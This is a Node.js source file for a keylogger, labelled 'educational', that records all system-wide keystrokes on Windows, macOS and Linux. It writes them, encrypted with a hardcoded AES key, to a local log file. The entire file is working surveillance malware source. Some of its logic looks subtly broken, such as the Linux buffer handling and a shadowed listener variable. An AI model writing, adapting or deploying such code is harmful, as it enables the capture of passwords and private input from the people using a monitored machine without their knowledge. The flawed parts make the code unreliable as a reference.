'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const EventEmitter = require('events').EventEmitter;

// Try to load node-global-key-listener for Windows/Mac
let GlobalKeyboardListener;
try {
  const { GlobalKeyboardListener } = require('node-global-key-listener');
  module.exports.GlobalKeyboardListener = GlobalKeyboardListener;
} catch (e) {
  console.log('[INFO] node-global-key-listener not installed. Linux mode will be used.');
}

// Load keycodes for Linux fallback
const toKey = require('./keycodes');

// Configuration
const LOG_DIR = path.join(__dirname, '..', 'logs');
const LOG_FILE = path.join(LOG_DIR, 'keystrokes.log');
const SECRET_KEY = 'node-keylogger-secret-32-chars!!'; // 32 chars for AES-256

const EVENT_TYPES = ['keyup', 'keypress', 'keydown'];
const EV_KEY = 1;

// Ensure logs directory exists
if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true });
}

// ============ ENCRYPTION HELPERS ============

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(SECRET_KEY), iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(encryptedData) {
  try {
    const parts = encryptedData.split(':');
    if (parts.length !== 2) return null;
    const iv = Buffer.from(parts[0], 'hex');
    const encrypted = parts[1];
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(SECRET_KEY), iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (err) {
    return null;
  }
}

// ============ LOGGING ============

function writeLog(keyData, source) {
  const entry = {
    timestamp: new Date().toISOString(),
    key: keyData,
    source: source || 'unknown'
  };
  
  const encrypted = encrypt(JSON.stringify(entry));
  fs.appendFileSync(LOG_FILE, encrypted + '\n', { flag: 'a' });
  
  // Overwrite same line in console
  const time = entry.timestamp.split('T')[1].split('.')[0];
  process.stdout.write(`\r[${source}] ${keyData} @ ${time}`.padEnd(60));
}

// ============ LINUX KEYBOARD CLASS (Original Logic Preserved) ============

function LinuxKeyboard(dev) {
  this.dev = dev || 'event0';
  this.bufferSize = 24;
  this.buffer = Buffer.alloc(this.bufferSize);
  
  try {
    this.data = fs.createReadStream(`/dev/input/${this.dev}`);
    this.onRead();
  } catch (err) {
    console.error(`[ERROR] Cannot access /dev/input/${this.dev}. Run with sudo.`);
    throw err;
  }
}

LinuxKeyboard.prototype = Object.create(EventEmitter.prototype, {
  constructor: { value: LinuxKeyboard }
});

LinuxKeyboard.prototype.onRead = function onRead() {
  const self = this;

  this.data.on('data', data => {
    this.buffer = data.slice(24);
    let event = parseLinuxEvent(this, this.buffer);
    if (event) {
      event.dev = self.dev;
      self.emit(event.type, event);
    }
  });

  this.data.on('error', err => {
    self.emit('error', err);
    console.error('Error reading device:', err.message);
  });
};

function parseLinuxEvent(input, buffer) {
  let event;
  if (buffer.readUInt16LE(16) === EV_KEY) {
    event = {
      timeS: buffer.readUInt16LE(0),
      timeMS: buffer.readUInt16LE(8),
      keyCode: buffer.readUInt16LE(18),
    };
    event.keyId = toKey[event.keyCode];
    event.type = EVENT_TYPES[buffer.readUInt32LE(20)];
  }
  return event;
}

LinuxKeyboard.Keys = toKey;

// ============ WINDOWS/MAC MODE (node-global-key-listener) ============

async function startGlobalListenerMode() {
  const { GlobalKeyboardListener } = require('node-global-key-listener');
  const keyboard = new GlobalKeyboardListener();

  console.log('=== Educational Keylogger [Global Listener mode] ===');
  console.log('Platform:', process.platform);
  console.log('Log file:', LOG_FILE);
  console.log('Press Ctrl+C to stop\n');

  // Capture all key events
  keyboard.addListener((e) => {
    const key = e.name || `[${e.vKey}]`;
    const state = e.state === 'DOWN' ? '↓' : '↑';
    writeLog(`${state} ${key}`, 'global-listener');
    return true; // Allow key to pass through
  });

  // Keep process alive
  process.on('SIGINT', () => {
    console.log('\n\n=== Stopping Keylogger ===');
    console.log('Logs saved to:', LOG_FILE);
    process.exit(0);
  });
}

// ============ LINUX MODE ============

function startLinuxMode() {
  console.log('=== Educational Keylogger [Linux mode] ===');
  console.log('Platform:', process.platform);
  console.log('Log file:', LOG_FILE);
  console.log('Press Ctrl+C to stop\n');

  const kb = new LinuxKeyboard('event0');

  kb.on('keydown', (event) => {
    const key = event.keyId || `[CODE_${event.keyCode}]`;
    writeLog(key, 'linux');
  });

  kb.on('error', (err) => {
    console.error('Keyboard error:', err);
  });

  process.on('SIGINT', () => {
    console.log('\n\n=== Stopping Keylogger ===');
    console.log('Logs saved to:', LOG_FILE);
    process.exit(0);
  });
}

// ============ MAIN ============

async function start() {
  if (process.platform === 'win32' || process.platform === 'darwin') {
    try {
      await startGlobalListenerMode();
    } catch (err) {
      console.error('[ERROR] Failed to start global listener:', err.message);
      console.error('Try running as Administrator (Windows) or with accessibility permissions (Mac)');
      process.exit(1);
    }
  } else if (process.platform === 'linux') {
    console.log('[INFO] Linux detected. Using /dev/input mode (run with sudo).');
    startLinuxMode();
  } else {
    console.error('[ERROR] Unsupported platform:', process.platform);
    process.exit(1);
  }
}

// Export for module use
module.exports = {
  start,
  LinuxKeyboard,
  Keys: toKey,
  encrypt,
  decrypt,
  LOG_FILE,
  writeLog
};

// If run directly
if (require.main === module) {
  start();
}